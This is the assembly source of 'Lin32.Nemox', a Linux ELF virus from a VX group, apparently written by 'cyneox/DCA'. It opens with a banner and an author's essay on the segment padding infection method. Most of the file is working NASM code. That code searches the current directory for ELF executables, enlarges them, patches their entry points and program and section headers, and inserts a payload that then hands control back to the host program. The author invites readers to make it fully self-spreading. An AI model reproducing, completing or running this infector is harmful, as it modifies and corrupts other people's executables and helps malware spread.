;     .........................................................
;     :         ____ ___.__. ____   ____  _______  ___        :
;     :       _/ ___<   |  |/    \_/ __ \/  _ \  \/  /        :
;     :       \  \___\___  |   |  \  ___(  <_> >    <         :
;     :        \___  > ____|___|  /\___  >____/__/\_ \        :
;     :            \/\/         \/     \/           \/        :
;     :                   __www.cyneox.tk_                    :
;     :                                                       :
;     :                                                       :
;     :                        member of                      :
;     :                                                       :
;     :             _______  _________     _____              :
;     :            \______ \ \_   ___ \   /  _  \             :
;     :             |    |  \/    \  \/  /  /_\  \            :
;     :             |    `   \     \____/    |    \           :
;     :            /_______  /\______  /\____|__  /           :
;     :                    \/        \/         \/            :
;     :                ( Dark Coderz Attitude )               :
;     :                   __www.dca-vx.tk__                   :
;     :.......................................................:
;
;                    * * * * * * * * * * * * * *
;                  ** Lin32.Nemox by cyneox/DCA **
;                    * * * * * * * * * * * * * *
;
;
;     |-------------------------------------------------------|
;     |                     INTRODUCING                       |
;     |-------------------------------------------------------|
;         Nemo = "nobody".Probably you're asking yourself
;         why did I take this name for this *creation*.
;         Well its a long story...As my ex-girlfriend was
;         mean to me , I felt like a "nobody".So I decided
;         to call my new *half* virus : Nemox.Quite interes-
;         ting , isnt it !? ;)
;
;         It took a very long time to write this fucking 
;         source coz ASM was new to me and unfriendly ;(.
;         I had to suspend this project coz at that moment
;         I had no idea how to solve some problems etc.And 
;         then I've started with "Nf3ct0r" which was written
;         in C ( quite simple ).I've noticed ASM isnt so hard
;         to learn.You need time to explore it.
;
;         I had to learn that not everything will work under 
;         ASM... I know you might say : "Everything is po-
;         ssible blah blah."You're right : When you concen-
;         trate on your work then you'll achieve your expec-
;         tations too.
;
;         I hope I'll have enough time to write more ASM virii
;         coz my main programming language was/is still C.
;         I love ASM too but C is simply easier to code...
;
;
;     |-------------------------------------------------------|
;     |                   ABOUT Lin32.Nemox                   |
;     |-------------------------------------------------------|
;         Lin32.Nemox is a half virus which will infect any
;         ELF files in the current directory: "." .I've wrote
;         some lame functions which will search for ELF files
;         check if they are infectable or not and then start
;         the infection procedure.
;
;         It is using the common "Segment Padding Infection"
;         procedure.That means : segments needed for execution
;         will be padded properly to reflect the insertion
;         of our virus code.We will copy our virus code after
;         the code segment ( between .text and .data ).
;         Then we will update the PHDR(Program Header) and 
;         SHDR(Sections Header) so that they contain the cor-
;         rect information about the file which has been 
;         "infected".
;
;         Nemox is using the same technique which I've used
;         when I coded Nfect0r.So if you didnt get it just 
;         search for Nf3ct0r ;6) . Q.:Why a half virus !?
;         R.: well I dont want that stupid user will simply
;         execute my binaries and getting infected( I mean 
;         the whole system) without knowing that.If they
;         want to transform my source codes into fully 
;         functionable viruses they should do that at their
;         own risk.
;
;         A virus which is executing only his own virus code
;         is a dead virus.So I've chosed a simply method how
;         to return to the host code...At the beginning of 
;         my virus code I wrote : "push dword 0x0".Later on
;         the "0x0" will be replaced with the original entry
;         point of the host file.At the end of the virus code
;         I wrote "ret" which will return the programm execu-
;         tion to "push dword [original entry point".Its quite
;         simple to understand and isnt so suspicious like 
;         a "jmp" procedure.
;
;         Many ppl have told to me I shouldnt use "much" 
;         stack in my programm.Well it does.I didnt want to
;         use a temporary file were I could write all that
;         info about the target: entry point , several 
;         offsets , file size , file name etc.If u want to
;         improve that feel free and just do it...
;         I always use the stack for data storage etc.Its 
;         "cheap" and simply usable.
;
;         Well I'm so happy that I've finished this project
;         although my work wasnt so "perfect": After infec-
;         ting several executables I've realized that the
;         string table got fucked up , that means I couldnt
;         see the names of several section etc.Well thats 
;         very vulnerable to many AV's but thats not my 
;         problem.If u want to improve this code just do it
;         and make it even better ;) 
;
;         What really mathers to me , is that Lin32.Nemox 
;         really worked that way I wanted to...

;
;
;     |-------------------------------------------------------|
;     |                      HOW TO...                        |
;     |-------------------------------------------------------|
;         cyneox@dca:~>nasm -f elf -o nemox.o nemox.asm
;         cyneox@dca:~>ld -o nemox nemox.o


%define SZ_STACK 1000
%define SZ_EHDR 564          ; sizeof(struct ehdr)
%define SZ_MMAP 24
%define ELF 464c457fh
%define PT_LOAD 1
%define PT_DYNAMIC 2
%define PT_PHDR 6
%define TEXT_SECT 2          ; phdr[2] - .text section
%define DATA_SECT 3          ; phdr[3] - .data section
%define E_ENTRY 0x18         ; offset to entry point of file
%define SYS_READDIR 89
%define SYS_READ 3
%define SYS_WRITE 4
%define SYS_OPEN 5
%define SYS_CLOSE 6
%define SYS_UNLINK 10 
%define SYS_LSEEK 19
%define SYS_MMAP 90
%define SYS_MUNMAP 91
%define SYS_FTRUNCATE 93
%define SYS_FSTAT 108

section .text
global _start

_start:
       ; saving registers : (normal) registers
       ;                  : flag resgisters
              pusha
		  pushf

		  call hi_baby

hi_baby:
              pop ebp
		  sub ebp,hi_baby         ; ebp=0
		  sub esp,SZ_STACK        ; reserving memory for stack...

		  lea ebx,[ebp+point]     ; opening current working directory "."
		  mov ecx,0
		  call sys.open

		  mov dword [esp+SZ_STACK-4],eax ; saving fd to stack

		  cmp eax,0
		  jge e_bine              ; good fd :p
		  jmp close


e_bine:
              mov ecx,esp             ; move to ecx the address of stack
		                          ; -> needed for the sys call : readdir()
		  mov ebx,[esp+SZ_STACK-4] ; fd

readdir:

	; this function "readdir" should be recursive
	; we'll call it everytime we find a file in the directory

	        call sys.readdir

		  dec eax                 ; eax should be 1
		  jz ok_dir
		  jmp close

ok_dir:
              pushad                  ; saving registers

		  mov ebx,ecx             ; ecx = addr of stack
		  add ebx,10              ; 10 = offset to file name
		  mov dword [esp+SZ_STACK-8],ebx ; saving file name to stack

		  xor ecx,ecx
		  mov ecx,2               ; O_RDWR
		  call sys.open

		  mov dword [esp+SZ_STACK-12],eax ; saving fd (of file) to stack
		  cmp eax,0
		  jg check_file

close2:
              mov ebx,[esp+SZ_STACK-12] ; fd
		  call sys.close
		  popad                   ; restoring registers
		  jmp readdir

check_file:

	; check if file is executable or not...
	; remember: ELF files have an "ELF" on the beginning
	; of the file...

		  mov ebx,[esp+SZ_STACK-12] ; fd
		  sub esp,SZ_EHDR
		  mov ecx,esp
		  mov edx,SZ_EHDR
		  call sys.read

		  mov esi,dword [ecx]
		  cmp esi,ELF
		  jne near back

	        cmp byte [ecx+10h],02h  ; is executable ???
 		  jne near back

is_exec:

       ; searching for the pht entry containing the .text segment
       ; we want to infect our host file between the end of the .text
       ; section and the beginning of the .data section

              add ecx,20h             ; 20h = offset to next PHT entry
		  dec dword [ecx+14h]     ; p_offset; loadable ???
		  jnz is_exec

		  mov eax,dword [ecx+28h] ; p_memsz
		  mov dword [esp+SZ_EHDR+SZ_STACK-16],eax ; saving p_memsz to stack
	        neg eax
		  and ah,0fh
		  cmp ax,vircode_len  
		  jb close2

		  movzx esi,ax            ; esi = vir size

		  mov ebx,[esp+SZ_EHDR+SZ_STACK-12] ; fd
		  mov ecx,esp
		  call sys.fstat


		  mov edi,dword [ecx+14h] ; st_size = file size
		  mov dword [esp+SZ_EHDR+SZ_STACK-20],edi ; saving file sz to stack

	; truncate to new file size so it can
	; reflect the infection of our virus.
	
	        xor ecx,ecx
		  mov ch,10h
		  add ecx,edi
		  mov dword [esp+SZ_EHDR+SZ_STACK-24],ecx ; new file size
		  call sys.ftruncate


		  mov ecx,[esp+SZ_EHDR+SZ_STACK-24] ; (new)file size
		  mov edx,[esp+SZ_EHDR+SZ_STACK-12] ; fd

		  ; initialising mmap structure...
		  sub esp,SZ_MMAP
		  mov dword [esp],0       ; int start
		  mov dword [esp+4],ecx   ; mapping whole file...->ecx = file sz
		  mov dword [esp+8],3     ; PROT_READ+PROT_WRITE = READ_WRITE (3)
		  mov dword [esp+12],1    ; MAP_SHARED (1)
		  mov dword [esp+16],edx  ; fd
		  mov dword [esp+20],0    ; offset = 0
		  mov ebx,esp             ; ptr to mmap structure
              call sys.mmap

		  add esp,SZ_MMAP         ; restoring data

		  cmp eax,-1
		  jne ok_mmap

		  mov ebx,[esp+SZ_EHDR+SZ_STACK-12] ; fd
		  mov ecx,[esp+SZ_EHDR+SZ_STACK-20] ; original file size

		  ; truncating to original size
		  call sys.ftruncate

back:		  
              add esp,SZ_EHDR
		  jmp close2


ok_mmap:

		  mov dword [esp+SZ_EHDR+SZ_STACK-28],eax ; storing map
                                                      ; address
		  mov dword [esp+SZ_EHDR+SZ_STACK-32],esi ; vir size

		  mov esi,[esp+SZ_EHDR+SZ_STACK-28]       ; mmap addr
		  mov ebx,[esi+0x1c]                      ; offset to first
                                                      ; byte of phdr section
		  add esi,ebx
		  mov ecx,[esi+32*TEXT_SECT+16]           ; p_filesz
		  mov edx,[esi+32*TEXT_SECT+12]           ; p_vaddr
		  
		  add ecx,edx                             ; p_filesz+p_vaddr
              add ecx,15
		  and ecx,~15


		  ; saving old entry point...
		  mov esi,[esp+SZ_EHDR+SZ_STACK-28]       ; map addr
		  mov eax,[esi+E_ENTRY]
		  add edx,eax
		  mov dword [esp+SZ_EHDR+SZ_STACK-36],eax ; old e_entry

		  ; writting/saving new entry point(ecx)...
		  mov dword [esi+E_ENTRY],ecx             ; ecx=new e_entry
		  

		  ; patching e_phoff...
		  mov esi,[esp+SZ_EHDR+SZ_STACK-28]       ; mmap addr
		  mov ebx,[esi+0x1c]                      ; off to pht
		  mov dword [esp+SZ_EHDR+SZ_STACK-44],ebx ; save old e_phoff
		  mov eax,[esp+SZ_EHDR+SZ_STACK-40]       ; old p_filesz
		  		  	  
		  add esi,ebx                             ; move to first byte of phdr

		  mov ecx,dword [esi+32*TEXT_SECT+16]     ; ecx = p_filesz
		  mov dword [esp+SZ_EHDR+SZ_STACK-40],ecx ; (old)p_filesz


		  ; patching p_filesz
		  mov ebx,[esp+SZ_EHDR+SZ_STACK-32]       ; vir size
		  add dword [esi+32*TEXT_SECT+16],0x1000  ; patch p_filesz
		  
		  ; patching p_memsz 
		  mov ebx,[esp+SZ_EHDR+SZ_STACK-32]
		  add dword [esi+32*TEXT_SECT+20],0x1000  ; patch p_memsz 

                  
		  ; saving e_phnum...
		  mov esi,[esp+SZ_EHDR+SZ_STACK-28]
		  mov eax,dword [esi+0x2c]
		  and eax,0xffff
		  mov ecx,eax                             ; ecx = e_phnum
		 
		  mov edx,esi                             ; edx = ptr mapped file
		  mov eax,[esp+SZ_EHDR+SZ_STACK-44]       ; old e_phoff
		  add edx,eax                             ; move to phdr[0]
		  mov esi,0x1000
		  mov eax,[esp+SZ_EHDR+SZ_STACK-40]       ; (old)p_filesz
		  
	       

update_phdr:
		  
		  cmp dword [edx+4],eax                 ; compare if
                                                    ; p_offset >= end of codes segment ( (old)p_filesz)
		  jbe next_phdr
		  
		  add dword [edx+4],esi                 ; patch p_offset
		  
		  
next_phdr:
              add edx,20h                           ; next entry
		  loop update_phdr
		  
		 
		  
		  ; patching e_shoff...
		  mov ebx,[esp+SZ_EHDR+SZ_STACK-28]     ; map addr
		  mov ecx,[ebx+20h]                     ; e_shoff 
		  mov dword [esp+SZ_EHDR+SZ_STACK-44],ecx ; saving old e_shoff
		  mov eax,[esp+SZ_EHDR+SZ_STACK-40]     ; old p_filesz 
                  
		  ; patch e_shoff
		  add dword [ebx+20h],esi               ; patch e_shoff
		  
		  
                    
		  mov edx,[esp+SZ_EHDR+SZ_STACK-28]     ; mmap addr
		  mov ebx,ecx                           ; (old)e_shoff
		  add edx,ebx                           ; move to first byte
                                                        ; of shdr[0] 				        
		  
              ; saving e_phnum...
		  mov eax,[edx+30h]
		  and eax,0xffff                        ; eax = e_shnum
		  mov ecx,eax                           ; ecx = e_shnum
              mov eax,[esp+SZ_EHDR+SZ_STACK-40]     ; old p_filesz   
update_shdr:      
              cmp dword [edx+16],eax               ; if sh_offset >= p_filesz
		  jge do_patch                         ; then jump to do_patch
		  
		  mov ebx,dword [edx+16]
		  add ebx,dword [edx+20]               ; sh_size
		  cmp ebx,eax                          ; if sh_offset +
                                                   ; sh_size == (old)p_filesz
		
		  je patch_sh_size
		  jmp next_shdr                        ; else jump to next section
		  
patch_sh_size:
             add ebx,0x1000                        ; increasing lenght
                                                   ; of .rodata
		 jmp next_shdr				       
		  
do_patch:
		 add dword [edx+16],0x1000            ; patch sh_offset  
		 		 

next_shdr:	 

             add edx,28h                           ; next entry in the SHT
		 loop update_shdr

go_baby: 
		 
             ; seeking to beginning of file...
		 mov ebx,[esp+SZ_EHDR+SZ_STACK-12]     ; fd 
		 mov ecx,0                             ; beginning of file
		 mov edx,0                             ; SEEK_SET
		 call sys.lseek
		 		 
		 
            ; seeking to end of code segment ((old)p_filesz)
		mov ecx,[esp+SZ_EHDR+SZ_STACK-40]
	      call sys.lseek
		
		mov eax,[esp+SZ_EHDR+SZ_STACK-40]
		mov ebx,[esp+SZ_EHDR+SZ_STACK-20]      ; original file size
		sub ebx,eax
		sub esp,ebx
		
		mov edx,ebx
		mov esi,edx
		mov ebx,[esp+edx+SZ_EHDR+SZ_STACK-12]
		mov ecx,[esp+edx+SZ_EHDR+SZ_STACK-40]
		xor edx,edx
		call sys.lseek
		
		mov edx,esi
		mov ecx,esp
		call sys.read
		
write_virus: 
            ; now we must seek again in the file ...but this time with
            ; an aligned offset , needed to insert our virus properly
		
		mov ebx,[esp+edx+SZ_EHDR+SZ_STACK-12]
		mov ecx,[esp+edx+SZ_EHDR+SZ_STACK-40]
		add ecx,15
		and ecx,~15
		mov esi,edx                         ; save edx temporarly to esi
		mov edx,0                           ; SEEK_SET
		call sys.lseek
                
		; writting : "push ..."
		mov ecx,pushy
		mov edx,1
		call sys.write
		
		; writting : "[original entry point]" .--> "push [original e_entry]"
            mov ecx,[esp+esi+SZ_EHDR+SZ_STACK-36]
		push ecx
		mov ecx,esp
		mov edx,4
		call sys.write
	        
		pop ecx
	
		mov ebx,[esp+esi+SZ_EHDR+SZ_STACK-12]
		mov ecx,virus_code
		mov edx,vircode_len
		call sys.write
		
write_rest:
            ; now we must write the rest of the file...
		
		; now we must seek after the virus code to insert the rest
            ; of the file
		mov ecx,[esp+esi+SZ_EHDR+SZ_STACK-40]
		add ecx,0x1000
		mov edx,0
		call sys.lseek
                
		mov ecx,esp
		mov edx,esi
		call sys.write
		
		add esp,esi
							       
		
unmap:
            mov ebx,[esp+SZ_EHDR+SZ_STACK-28]       ; ptr to our
                                                    ; mapped file
			     				  
	      mov ecx,[esp+SZ_EHDR+SZ_STACK-24]       ; file size
            call sys.munmap
		jmp back

close:
            mov ebx,[esp+SZ_STACK-4]
		call sys.close          ; closing bad fd
bye:
              add esp,SZ_STACK
	        popf
	        popa
	        xor eax,eax
	        inc eax
	        int 0x80                ; SYS_EXIT 
		
pushy: 
             push dword 0x0
		  
virus_code:
             pushf 
	       pusha
	 
	       push dword 0x20200a3a
	       push dword 0x3a3a206b
	       push dword 0x742e786f
	       push dword 0x656e7963
	       push dword 0x2e777777
	       push dword 0x203A3A3A
	       mov eax,4
	       mov ebx,1
	       mov ecx,esp
	       mov edx,6*4
	       add esp,6*4
	       int 0x80
	       popa
	       popf
	       ret
		  
vircode_len equ $-virus_code		  
		  
		  

sys.open:
              mov eax,SYS_OPEN
		  int 0x80
		  ret
sys.read:
              mov eax,SYS_READ
		  int 0x80
		  ret

sys.write:
              mov eax,SYS_WRITE
		  int 0x80
		  ret

sys.ftruncate:
              mov eax,SYS_FTRUNCATE
		  int 0x80
		  ret

sys.lseek:
              mov eax,SYS_LSEEK
	 	  int 0x80
		  ret

sys.mmap:
              mov eax,SYS_MMAP
		  int 0x80
		  ret

sys.munmap:
              mov eax,SYS_MUNMAP
		  int 0x80
		  ret
sys.fstat:
              mov eax,SYS_FSTAT
		  xor edx,edx
		  int 0x80
		  ret
sys.unlink:
              mov eax,SYS_UNLINK
		  int 0x80
		  ret
sys.readdir:
              mov eax,SYS_READDIR
		  int 0x80
		  ret
sys.close:
              mov eax,SYS_CLOSE
		  int 0x80
		  ret




point db ".",0 
copyright db "cyneox/DCA (Dark Coderz Alliance)",0
